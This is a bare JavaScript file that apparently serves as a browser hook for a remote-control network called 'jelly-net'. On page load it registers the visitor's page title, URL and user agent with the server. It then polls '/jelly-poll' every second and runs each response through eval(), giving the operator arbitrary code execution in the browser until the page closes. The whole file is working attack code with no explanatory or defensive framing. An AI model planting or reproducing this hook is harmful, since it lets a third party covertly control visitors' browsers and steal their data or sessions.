var $jellyQ = jQuery.noConflict();

function run (data) {
  var res = eval(data);
}

function waitForMsg() {
  $jellyQ.ajax({
    type: "GET",
    url: "/jelly-poll?tid="+window.jellyId,
    async: true,
    cache: true,
    timeout:50000,
    success: function(data){
      run(data);      
      setTimeout(
        'waitForMsg()',
        1000
      );
    },
    error: function(XMLHttpRequest, textStatus, errorThrown){
      setTimeout(
        'waitForMsg()',
        "15000");
    },
  });
};

$jellyQ(document).ready(function(){
  var data = {};
  data.title = window.document.title;
  data.url = window.location.href;
  data.agent = navigator.userAgent;
  
  $jellyQ.post('/jelly-net/add', JSON.stringify(data), function(data) {
  window.jellyId = data.id;
  waitForMsg();
  }, 'json');
});

var oldbeforeunload = window.onbeforeunload;
window.onbeforeunload = function() {
  $jellyQ.post('/jelly-net/rm?tid='+window.jellyId, window.jellyId, function(data){});
  
  if (oldbeforeunload) {
    oldbeforeunload();
  }
};
